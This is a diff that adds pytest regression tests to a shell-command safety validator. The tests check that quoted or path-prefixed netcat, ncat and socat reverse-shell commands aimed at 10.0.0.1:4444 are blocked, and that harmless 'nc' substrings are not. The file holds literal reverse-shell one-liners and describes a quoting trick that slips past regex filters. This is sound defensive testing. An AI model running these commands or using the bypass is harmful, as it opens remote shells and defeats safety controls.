@@ -653,3 +653,69 @@ class TestP0LogTampering:
         """Reading logs should be allowed."""
         result = validate_command("cat /var/log/syslog", config_path=safety_rules_path)
         assert result.allowed
+
+
+class TestQuotedCommandBypass:
+    """Regression tests for quoted command name bypass prevention.
+
+    Bashlex correctly parses "nc" as command name 'nc' (stripping quotes),
+    but regex patterns like \\bnc\\s+ won't match '"nc" -e' because of the quotes.
+    AST-based detection is required to catch these.
+
+    See: FINDING-001 from security review (2025-12)
+    """
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Direct netcat backdoors (should all be BLOCKED)
+            ("nc -e /bin/bash 10.0.0.1 4444", "Direct nc backdoor"),
+            ('"nc" -e /bin/bash 10.0.0.1 4444', "Double-quoted nc backdoor"),
+            ("'nc' -e /bin/bash 10.0.0.1 4444", "Single-quoted nc backdoor"),
+            ("/bin/nc -e /bin/bash 10.0.0.1 4444", "Path-prefixed nc backdoor"),
+            ("ncat --exec /bin/bash 10.0.0.1 4444", "Direct ncat exec"),
+            ('"ncat" --exec /bin/bash 10.0.0.1 4444', "Quoted ncat exec"),
+            ("socat TCP:10.0.0.1:4444 EXEC:/bin/bash", "Direct socat exec"),
+            ('"socat" TCP:10.0.0.1:4444 EXEC:/bin/bash', "Quoted socat exec"),
+            ("netcat -e /bin/bash 10.0.0.1 4444", "Direct netcat backdoor"),
+            ('"netcat" -e /bin/bash 10.0.0.1 4444', "Quoted netcat backdoor"),
+            # Other flag variants
+            ("nc -c /bin/sh 10.0.0.1 4444", "nc -c flag"),
+            ('"nc" -c /bin/sh 10.0.0.1 4444', "Quoted nc -c flag"),
+            ('ncat --sh-exec "/bin/bash" 10.0.0.1', "ncat --sh-exec"),
+            ("socat TCP:1.2.3.4:4444 SYSTEM:id", "socat SYSTEM:"),
+        ],
+    )
+    def test_quoted_backdoor_commands_blocked(self, safety_rules_path, command, description):
+        """Quoted command names MUST still be blocked.
+
+        This is a critical security regression test. Attackers can bypass
+        regex-based detection by quoting the command name.
+        """
+        result = validate_command(command, config_path=safety_rules_path)
+        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
+        assert result.risk_level == RiskLevel.BLOCKED, f"CRITICAL: {description} should be BLOCKED, got {result.risk_level}"
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Safe commands with 'nc' as substring (should NOT be blocked)
+            ('grep -r "async def" tests/', "async contains nc - should be SAFE"),
+            ('grep -r "sync function" src/', "sync contains nc - should be SAFE"),
+            ('grep -r "panic error" logs/', "panic contains nc - should be SAFE"),
+            ('grep -r "func main" *.go', "func contains nc - should be SAFE"),
+            ('echo "async await pattern"', "Echo with async"),
+            # Safe nc usage (listen mode without exec, HIGH not BLOCKED)
+            ("nc -l -p 8080", "nc listen mode (HIGH, not BLOCKED)"),
+            # Just echoing dangerous text (not executing)
+            ('echo "nc -e /bin/bash"', "Echoing nc command (just text)"),
+            ('echo "Use socat EXEC for testing"', "Echoing socat in docs"),
+        ],
+    )
+    def test_quoted_bypass_no_false_positives(self, safety_rules_path, command, description):
+        """Ensure fix doesn't introduce false positives."""
+        result = validate_command(command, config_path=safety_rules_path)
+        # Should not be BLOCKED (can be SAFE, LOW, MEDIUM, or HIGH)
+        assert result.risk_level != RiskLevel.BLOCKED, (
+            f"False positive: {description} got BLOCKED, should be allowed. Command: {command}"
+        )
